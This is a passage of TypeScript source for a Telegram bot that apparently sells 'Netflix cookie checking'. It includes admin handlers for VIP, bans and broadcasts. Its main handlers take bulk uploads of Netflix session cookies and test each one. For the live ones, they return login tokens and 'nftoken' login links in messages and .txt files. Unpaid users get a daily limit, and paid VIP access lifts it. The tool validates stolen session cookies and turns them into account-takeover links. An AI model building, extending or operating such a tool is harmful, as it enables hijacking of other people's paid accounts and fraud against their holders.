      const allUsers = storage.getAllUsers();
      const vips = allUsers.filter(u => storage.isVip(u.telegramId));
      if (vips.length === 0) {
        return bot.sendMessage(chatId, "No VIP users.", {
          reply_markup: { inline_keyboard: [[{ text: "🔙 Admin", callback_data: "admin_back" }]] }
        });
      }
      let text = `👑 <b>VIP Users (${vips.length})</b>\n${"─".repeat(30)}\n\n`;
      vips.forEach(v => {
        text += `• ${esc(v.firstName)} (@${esc(v.username || "N/A")}) — ID: ${v.telegramId}\n`;
      });
      return bot.sendMessage(chatId, text, {
        parse_mode: "HTML",
        reply_markup: { inline_keyboard: [[{ text: "🔙 Admin", callback_data: "admin_back" }]] }
      });
    }

    if (data === "admin_add_vip") {
      if (!isOwner(userId)) return;
      pending[userId] = { action: "admin_add_vip" };
      return bot.sendMessage(chatId, "Send user ID to grant VIP (format: ID or ID DAYS):");
    }

    if (data === "admin_lock_nf") {
      if (!isOwner(userId)) return;
      storage.setNetflixLocked(true);
      return bot.sendMessage(chatId, "🔒 Netflix locked.", { reply_markup: { inline_keyboard: adminMenu() } });
    }
    if (data === "admin_unlock_nf") {
      if (!isOwner(userId)) return;
      storage.setNetflixLocked(false);
      return bot.sendMessage(chatId, "🔓 Netflix unlocked.", { reply_markup: { inline_keyboard: adminMenu() } });
    }

    if (data === "admin_broadcast") {
      if (!isOwner(userId)) return;
      pending[userId] = { action: "admin_broadcast" };
      return bot.sendMessage(chatId, "📢 Send the broadcast message:");
    }

    if (data === "admin_ban_prompt") {
      if (!isOwner(userId)) return;
      pending[userId] = { action: "admin_ban" };
      return bot.sendMessage(chatId, "Send user ID to ban:");
    }

    if (data === "admin_unban_prompt") {
      if (!isOwner(userId)) return;
      pending[userId] = { action: "admin_unban" };
      return bot.sendMessage(chatId, "Send user ID to unban:");
    }

    if (data === "admin_banned") {
      if (!isOwner(userId)) return;
      const allUsers = storage.getAllUsers();
      const banned = allUsers.filter(u => u.isBanned);
      if (banned.length === 0) {
        return bot.sendMessage(chatId, "No banned users.", {
          reply_markup: { inline_keyboard: [[{ text: "🔙 Admin", callback_data: "admin_back" }]] }
        });
      }
      let text = `🚫 <b>Banned Users (${banned.length})</b>\n${"─".repeat(30)}\n\n`;
      banned.forEach(b => {
        text += `• ${esc(b.firstName)} (@${esc(b.username || "N/A")}) — ID: ${b.telegramId}\n`;
      });
      return bot.sendMessage(chatId, text, {
        parse_mode: "HTML",
        reply_markup: { inline_keyboard: [[{ text: "🔙 Admin", callback_data: "admin_back" }]] }
      });
    }

    if (data === "admin_users") {
      if (!isOwner(userId)) return;
      const allUsers = storage.getAllUsers();
      let text = `👥 <b>All Users (${allUsers.length})</b>\n${"─".repeat(30)}\n\n`;
      const show = allUsers.slice(0, 50);
      show.forEach(u => {
        const vip = storage.isVip(u.telegramId) ? "👑" : "";
        const banned = u.isBanned ? "🚫" : "";
        text += `${vip}${banned} ${esc(u.firstName)} (@${esc(u.username || "N/A")}) — ${u.telegramId}\n`;
      });
      if (allUsers.length > 50) text += `\n... and ${allUsers.length - 50} more`;
      return bot.sendMessage(chatId, text, {
        parse_mode: "HTML",
        reply_markup: { inline_keyboard: [[{ text: "🔙 Admin", callback_data: "admin_back" }]] }
      });
    }

    if (data === "admin_referral") {
      if (!isOwner(userId)) return;
      const config = storage.getConfig();
      const stats = storage.getStats();
      let text = `🔗 <b>Referral Settings</b>\n${"─".repeat(30)}\n\n`;
      text += `🎁 <b>Bonus per referral:</b> ${config.referralBonus} checks\n`;
      text += `👥 <b>Total referrals:</b> ${stats.totalReferrals}\n\n`;
      text += `Use /setbonus [number] to change bonus amount`;
      return bot.sendMessage(chatId, text, {
        parse_mode: "HTML",
        reply_markup: { inline_keyboard: [[{ text: "🔙 Admin", callback_data: "admin_back" }]] }
      });
    }
  });

  bot.on("message", async (msg) => {
    if (!msg.from || msg.chat.type !== "private") return;
    const userId = msg.from.id;
    const chatId = msg.chat.id;
    const text = msg.text || "";

    if (text.startsWith("/")) return;

    const userPending = pending[userId];
    if (!userPending) return;

    if (userPending.action === "admin_broadcast" && isOwner(userId)) {
      const allUsers = storage.getAllUsers();
      let sent = 0;
      for (const u of allUsers) {
        try {
          await bot.sendMessage(Number(u.telegramId), text, { parse_mode: "HTML" });
          sent++;
        } catch {}
      }
      delete pending[userId];
      return bot.sendMessage(chatId, `📢 Broadcast sent to ${sent}/${allUsers.length} users.`, {
        reply_markup: { inline_keyboard: adminMenu() }
      });
    }

    if (userPending.action === "admin_add_vip" && isOwner(userId)) {
      const args = text.split(" ");
      const targetId = args[0];
      const days = args[1] ? parseInt(args[1]) : undefined;
      storage.setVip(targetId, days);
      delete pending[userId];
      return bot.sendMessage(chatId, `✅ VIP granted to ${targetId}${days ? ` for ${days} days` : " (permanent)"}`, {
        reply_markup: { inline_keyboard: adminMenu() }
      });
    }

    if (userPending.action === "admin_ban" && isOwner(userId)) {
      storage.banUser(text.trim());
      delete pending[userId];
      return bot.sendMessage(chatId, `⛔ Banned user ${text.trim()}`, {
        reply_markup: { inline_keyboard: adminMenu() }
      });
    }

    if (userPending.action === "admin_unban" && isOwner(userId)) {
      storage.unbanUser(text.trim());
      delete pending[userId];
      return bot.sendMessage(chatId, `✅ Unbanned user ${text.trim()}`, {
        reply_markup: { inline_keyboard: adminMenu() }
      });
    }

    if (userPending.action === "nf_token_only") {
      let cookieText = "";
      if (msg.document) {
        const extracted = await extractFileText(msg);
        if (!extracted) return;
        cookieText = extracted;
      } else {
        cookieText = text;
      }

      const cookies = parseCookiesFromText(cookieText);
      if (cookies.length === 0) {
        return bot.sendMessage(chatId, "❌ No valid cookies found.", { parse_mode: "HTML" });
      }

      const vip = storage.isVip(String(userId)) || isOwner(userId);
      const used = storage.getDailyChecks(String(userId));
      const canCheck = vip ? cookies.length : Math.min(cookies.length, DAILY_LIMIT - used);

      if (canCheck <= 0) {
        delete pending[userId];
        return bot.sendMessage(chatId,
          `⚠️ Daily limit reached. Get VIP!\nContact: @XK6271`,
          { parse_mode: "HTML", reply_markup: { inline_keyboard: mainMenu() } }
        );
      }

      const toCheck = cookies.slice(0, canCheck);
      if (toCheck.length < cookies.length) {
        await bot.sendMessage(chatId, `⚠️ Checking only ${toCheck.length} of ${cookies.length} (daily limit).`);
      }

      cancelled.delete(userId);
      const statusMsg = await bot.sendMessage(chatId,
        `🔑 Generating tokens for <b>${toCheck.length}</b> cookie(s)...\n\n⏳ Please wait...\n\nType /cancel to stop`,
        { parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "❌ Cancel", callback_data: "cancel_check" }]] } }
      );

      let hits = 0;
      let dead = 0;
      let stopped = false;
      const tokenHits: { token: string; country: string; plan: string; loginUrl: string }[] = [];

      for (let i = 0; i < toCheck.length; i++) {
        if (cancelled.has(userId)) { stopped = true; cancelled.delete(userId); break; }
        try {
          if (i > 0 && i % 5 === 0) {
            try {
              await bot.editMessageText(
                `🔑 Generating... ${i}/${toCheck.length}\n\n✅ Tokens: ${hits} | ❌ Dead: ${dead}\n\nType /cancel to stop`,
                { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "❌ Cancel", callback_data: "cancel_check" }]] } }
              );
            } catch {}
          }

          const result = await checkNetflixCookie(toCheck[i]);
          if (result.success && result.token) {
            hits++;
            const flag = getCountryFlag(result.country || "");
            const loginUrl = result.loginUrl || `https://netflix.com/account?nftoken=${result.token}`;
            tokenHits.push({ token: result.token, country: result.countryName || "Unknown", plan: result.plan || "Unknown", loginUrl });
            await bot.sendMessage(chatId,
              `🔑 <b>Token #${hits}</b>\n${flag} ${esc(result.countryName || "Unknown")} | ${esc(result.plan || "Unknown")}\n🔗 <a href="${esc(loginUrl)}">Login Link</a>\n<code>${esc(result.token)}</code>\n\n<i>by @XK6271</i>`,
              { parse_mode: "HTML", disable_web_page_preview: true }
            );
          } else {
            dead++;
          }
        } catch { dead++; }
      }

      storage.addDailyChecks(String(userId), stopped ? hits + dead : toCheck.length);

      try {
        await bot.editMessageText(
          `${stopped ? "⛔ <b>Cancelled!</b>" : "✅ <b>Token Generation Complete!</b>"}\n${"─".repeat(25)}\n\n📊 Checked: ${hits + dead}/${toCheck.length}\n🔑 Tokens: ${hits}\n❌ Dead: ${dead}`,
          { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: "HTML" }
        );
      } catch {}

      if (tokenHits.length > 0) {
        let fileContent = `NF Tokens - ${new Date().toLocaleString()}\nGenerated by @XK6271\n${"═".repeat(40)}\n\n`;
        tokenHits.forEach((t, i) => {
          fileContent += `═══ Token #${i + 1} ═══\nCountry: ${t.country}\nPlan: ${t.plan}\nToken: ${t.token}\nLogin: ${t.loginUrl}\n\n`;
        });
        fileContent += `${"═".repeat(40)}\nTotal Tokens: ${tokenHits.length}\nGenerated by @XK6271`;
        const buf = Buffer.from(fileContent, "utf8");
        await bot.sendDocument(chatId, buf, { caption: `🔑 ${tokenHits.length} NF Tokens | by @XK6271` }, { filename: `nf_tokens_${Date.now()}.txt`, contentType: "text/plain" });
      }

      delete pending[userId];
      return;
    }

    if (userPending.action === "nf_check") {
      let cookieText = "";
      if (msg.document) {
        const extracted = await extractFileText(msg);
        if (!extracted) return;
        cookieText = extracted;
      } else {
        cookieText = text;
      }

      const cookies = parseCookiesFromText(cookieText);
      if (cookies.length === 0) {
        return bot.sendMessage(chatId, "❌ No valid cookies found.", { parse_mode: "HTML" });
      }

      const vip = storage.isVip(String(userId)) || isOwner(userId);
      const used = storage.getDailyChecks(String(userId));
      const canCheck = vip ? cookies.length : Math.min(cookies.length, DAILY_LIMIT - used);

      if (canCheck <= 0) {
        delete pending[userId];
        return bot.sendMessage(chatId,
          `⚠️ Daily limit reached. Get VIP!\nContact: @XK6271`,
          { parse_mode: "HTML", reply_markup: { inline_keyboard: mainMenu() } }
        );
      }

      const toCheck = cookies.slice(0, canCheck);
      if (toCheck.length < cookies.length) {
        await bot.sendMessage(chatId, `⚠️ Checking only ${toCheck.length} of ${cookies.length} (daily limit).`);
      }

      cancelled.delete(userId);
      const statusMsg = await bot.sendMessage(chatId,
        `🔴 Checking <b>${toCheck.length}</b> Netflix cookie(s)...\n\n⏳ Please wait...\n\nType /cancel to stop`,
        { parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "❌ Cancel", callback_data: "cancel_check" }]] } }
      );

      let hits = 0;
      let dead = 0;
      let stopped = false;
      const nfHits: NFCheckResult[] = [];

      for (let i = 0; i < toCheck.length; i++) {
        if (cancelled.has(userId)) { stopped = true; cancelled.delete(userId); break; }
        try {
          if (i > 0 && i % 5 === 0) {
            try {
              await bot.editMessageText(
                `🔴 Checking... ${i}/${toCheck.length}\n\n✅ Hits: ${hits} | ❌ Dead: ${dead}\n\nType /cancel to stop`,
                { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "❌ Cancel", callback_data: "cancel_check" }]] } }
              );
            } catch {}
          }

          const result = await checkNetflixCookie(toCheck[i]);
          if (result.success && result.token) {
            hits++;
            nfHits.push(result);
            await bot.sendMessage(chatId, formatNFHit(result, hits), { parse_mode: "HTML", disable_web_page_preview: true });
          } else {
            dead++;
          }
        } catch { dead++; }
      }

      storage.addDailyChecks(String(userId), stopped ? hits + dead : toCheck.length);

      try {
        await bot.editMessageText(
          `${stopped ? "⛔ <b>Cancelled!</b>" : "✅ <b>Netflix Check Complete!</b>"}\n${"─".repeat(25)}\n\n📊 Checked: ${hits + dead}/${toCheck.length}\n✅ Hits: ${hits}\n❌ Dead: ${dead}`,
          { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: "HTML" }
        );
      } catch {}

      if (nfHits.length > 0) {
        let fileContent = `Netflix Hits - ${new Date().toLocaleString()}\nChecked by @XK6271\n${"═".repeat(40)}\n\n`;
        nfHits.forEach((h, i) => { fileContent += formatNFHitPlain(h, i + 1) + "\n"; });
        fileContent += `${"═".repeat(40)}\nTotal Hits: ${nfHits.length}\nChecked by @XK6271`;
        const buf = Buffer.from(fileContent, "utf8");
        await bot.sendDocument(chatId, buf, { caption: `🔴 ${nfHits.length} Netflix Hits | by @XK6271` }, { filename: `netflix_hits_${Date.now()}.txt`, contentType: "text/plain" });
      }

      delete pending[userId];
      return;
    }
  });

  bot.on("polling_error", (err) => {
    console.error("Bot polling error:", err.message);
  });

  console.log("✅ NF Token Bot is running!");
}
